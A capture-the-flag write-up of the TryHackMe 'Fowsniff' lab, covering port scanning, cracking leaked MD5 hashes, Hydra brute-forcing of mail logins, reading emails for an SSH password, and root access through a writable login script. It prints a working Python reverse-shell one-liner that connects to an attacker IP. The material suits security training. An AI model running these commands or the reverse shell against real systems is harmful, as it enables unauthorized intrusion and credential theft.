# THM - Fowsniff CTF

#### Ip: 10.10.199.225
#### Name: Fowsniff CTF
#### Rating: Easy

----------------------------------------------------------------------

![fowsniff.png](../assets/fowsniff_assets/fowsniff.png)

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also user the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
└─$ sudo nmap -p-  --min-rate 10000 10.10.63.19         
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-21 13:29 CDT
Nmap scan report for 10.10.63.19
Host is up (0.13s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap

Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds
```

Lets scan these ports using the `-sV` and `-sC` flags to enumerate versions and to use default Nmap scripts:

```text
┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
└─$ sudo nmap -sC -sV 10.10.63.19 -p 22,80,110,143   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-21 13:30 CDT
Nmap scan report for 10.10.63.19
Host is up (0.12s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 903566f4c6d295121be8cddeaa4e0323 (RSA)
|   256 539d236734cf0ad55a9a1174bdfdde71 (ECDSA)
|_  256 a28fdbae9e3dc9e6a9ca03b1d71b6683 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE RESP-CODES PIPELINING TOP USER SASL(PLAIN) UIDL
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: ID ENABLE more IMAP4rev1 LOGIN-REFERRALS AUTH=PLAINA0001 Pre-login have post-login listed capabilities OK IDLE LITERAL+ SASL-IR
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds
```

Navigating to the site on port 80 we find that there has been a security breach and services are down. We also find a note that the company's Twitter has also been hacked.

site.png

Heading to the Twitter page we find a link to a PasteBin page with what sounds like a password dump:

twitter.png

The PasteBin link had been removed, but I was able to still access the contents using the wayback machine:

wayback.png

The dump included:

```text
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4
```

Lets grab these usernames, and also the hashes and see if we can crack any of them

I can copy the usernames and hashes to a file called fowsniff_dump:

```text
┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
└─$ cat >> fowsniff_dump
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
^C
```

I can then grab just the usernames using `awk`:

```text
┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
└─$ cat fowsniff_dump | awk -F '@' '{print $1}' > users.txt
                                                                                                                             
┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
└─$ cat users.txt                                          
mauer
mustikka
tegel
baksteen
seina
stone
mursten
parede
sciana
```
And use similar syntax to get the hashes too:

```text
┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
└─$ cat fowsniff_dump | awk -F ':' '{print $2}'           
8a28a94a588a95b80163709ab4313aa4
ae1644dac5b77c0cf51e0d26ad6d7e56
1dc352435fecca338acfd4be10984009
19f5af754c31f1e2651edde9250d69bb
90dc16d47114aa13671c697fd506cf26
a92b8a29ef1183192e3d35187e0cfabd
0e9588cb62f4b6f27e33d449e2ba0b3b
4d6e42f56e127803285a0a7649b5ab11
f7fd98d380735e859f8b2ffbbede5a7e
```

Now lets copy these into https://crackstation.net/ and see if we can crack any of them:

cracked.png

Cool, CrackStation was able to crack all but one of the passwords. Lets add these to a file called pass.txt:

```text
┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
└─$ cat >> pass.txt                            
mailcall
bilbo101
apples01
skyler22
scoobydoo2
carp4ever
orlando12
07011972
^C
```

Lets take our users list and our password list and use Hydra to see if we can bruteforce Imap:

scooby.png

Nice, Hydra found valid credentials!

Lets login and read seina's emails:

```text
┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
└─$ nc -nv 10.10.63.19 110
(UNKNOWN) [10.10.63.19] 110 (pop3) open
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
.
retr 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

Nice, we've found the new temporary SSH credential! Trying to login as user seina, we see that they followed the advice and changed the passsword:

```text
┌──(ryan㉿kali)-[~/THM/Fowsniff_CTF]
└─$ ssh seina@10.10.63.19                         
The authenticity of host '10.10.63.19 (10.10.63.19)' can't be established.
ED25519 key fingerprint is SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.63.19' (ED25519) to the list of known hosts.
seina@10.10.63.19's password: 
Permission denied, please try again.
seina@10.10.63.19's password: 
```

Lets go back to Hydra and our username list and see if anyone on the team hasn't updated the password yet:

hydra2.png

Cool, looks like these credentials will work for user baksteen:

ssh.png

Cool, we are now logged in as user baksteen. Looking around I'm not seeing any user.txt or local.txt flags.

Lets upload a copy of LinPEAS.sh to the `/tmp` directory to help find a privilege escalation vector:

tansfer.png

LinPEAS finds an insteresting file which is writable:

group.png 

And if we view the 00-header file in `/etc/update-motd.d/` we find it executes `/opt/cube/cube.sh` when someone logs into SSH. `sh /opt/cube/cube.sh` 

So, looks like we should be able to overwrite a reverse shell to the file, set up a NetCat listener, login to SSH again, and the script will execute our shell as root.Lets give it a try:

```text
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.61.45",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
cube.png

We can then set up a listener and SSH back into the machine to catch a shell back

root_shell.png

From there we can see the root.txt flag!

root_flag.png

Thanks for following along!

-Ryan
